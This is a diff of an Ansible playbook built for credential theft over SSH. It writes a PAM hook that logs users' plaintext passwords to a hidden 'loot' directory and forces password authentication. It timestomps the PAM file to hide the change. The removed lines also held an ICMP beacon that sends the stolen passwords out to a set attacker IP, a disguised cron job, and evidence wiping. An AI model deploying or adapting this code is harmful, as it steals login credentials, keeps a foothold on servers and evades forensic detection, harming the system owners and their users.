@@ -1,93 +1,53 @@
 ---
-# ===============================================================
-# CONFIGURATION: MANUAL ATTACKER IP
-# ===============================================================
-- name: Set Attacker IP and Paths
-  set_fact:
-    attacker_ip: "10.10.10.48"
-    loot_dir: "/var/tmp/.system-cache"
-    loot_file: ".ssh_loot.txt"
-
-# --- STEP 1: DEPENDENCIES & DIRECTORIES ---
-- name: Ensure xxd is installed (for hex encoding)
-  become: yes
-  package:
-    name: xxd
-    state: present
-
-- name: Setup Hidden Loot Directory
+# 1. Setup the "Dead Drop" directory
+- name: Create hidden loot directory
   become: yes
   file:
-    path: "{{ loot_dir }}"
+    path: "/var/tmp/.system-cache"
     state: directory
     mode: '0777'
+    owner: root
+    group: root
 
-# --- STEP 2: REPAIR SSH & PAM CONFIGS ---
-- name: Force SSHD to use Password Auth and PAM
+# 2. Configure SSH and PAM in one loop
+- name: Force SSH and PAM configuration
   become: yes
   lineinfile:
-    path: /etc/ssh/sshd_config
-    regexp: "^#?{{ item.key }}"
-    line: "{{ item.key }} {{ item.value }}"
+    path: "{{ item.path }}"
+    regexp: "{{ item.regexp }}"
+    line: "{{ item.line }}"
+    insertbefore: "{{ item.insertbefore | default(omit) }}"
   loop:
-    - { key: "PasswordAuthentication", value: "yes" }
-    - { key: "UsePAM", value: "yes" }
-  register: ssh_config_change
+    - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
+    - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
+    - { path: '/etc/pam.d/sshd', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
+  register: ssh_trap_config
 
-- name: Restart SSH if config changed
-  become: yes
-  systemd:
-    name: ssh
-    state: restarted
-  when: ssh_config_change.changed
-
-- name: Inject Trap into SSH-Specific PAM File
-  become: yes
-  lineinfile:
-    path: /etc/pam.d/sshd
-    insertbefore: BOF
-    line: "auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check"
-
-# --- STEP 3: DEPLOY THE SCRIPTS ---
-- name: Deploy NUL-Safe PAM Logger
+# 3. Deploy the actual logger script
+- name: Deploy PAM credential logger
   become: yes
   copy:
     dest: /usr/local/bin/ssh-auth-check
     mode: '0755'
     content: |
       #!/bin/bash
+      # Read the password from stdin (provided by expose_authtok)
       read -d '' -r PASSWORD
       if [ -n "$PASSWORD" ]; then
-          echo "$(date) | User: $PAM_USER | RHOST: $PAM_RHOST | Pass: $PASSWORD" >> {{ loot_dir }}/{{ loot_file }}
+          # Log the timestamp, username, source IP, and the password
+          echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $PASSWORD" >> /var/tmp/.system-cache/.ssh_loot.txt
       fi
 
-- name: Deploy ICMP (Ping) Beacon
+# 4. Restart SSH only if we changed the config
+- name: Restart SSH service
   become: yes
-  copy:
-    dest: /usr/local/bin/sshbeacon
-    mode: '0755'
-    content: |
-      #!/bin/bash
-      ATTACKER_IP="{{ attacker_ip }}"
-      LOOT="{{ loot_dir }}/{{ loot_file }}"
+  systemd:
+    name: ssh
+    state: restarted
+  when: ssh_trap_config.changed
 
-      if [ -s "$LOOT" ]; then
-          # Convert loot to hex for the ping payload
-          HEX_PAYLOAD=$(cat "$LOOT" | xxd -p | tr -d '\n' | cut -c1-32)
-          ping -c 1 -p "$HEX_PAYLOAD" "$ATTACKER_IP" >/dev/null 2>&1
-          
-          # Wipe local evidence after "pinging" the data home
-          > "$LOOT"
-      fi
-
-# --- STEP 4: PERSISTENCE & STEALTH ---
-- name: Schedule Beacon (Every 1 Minute)
-  become: yes
-  cron:
-    name: "System Telemetry"
-    minute: "*"
-    job: "/usr/local/bin/sshbeacon >/dev/null 2>&1"
-
-- name: Anti-Forensics Timestamp Match
+# 5. Anti-Forensics: Make the SSH PAM file look untouched
+- name: Timestomp PAM config
   become: yes
   shell: "touch -r /etc/pam.d/common-password /etc/pam.d/sshd"
+  ignore_errors: yes
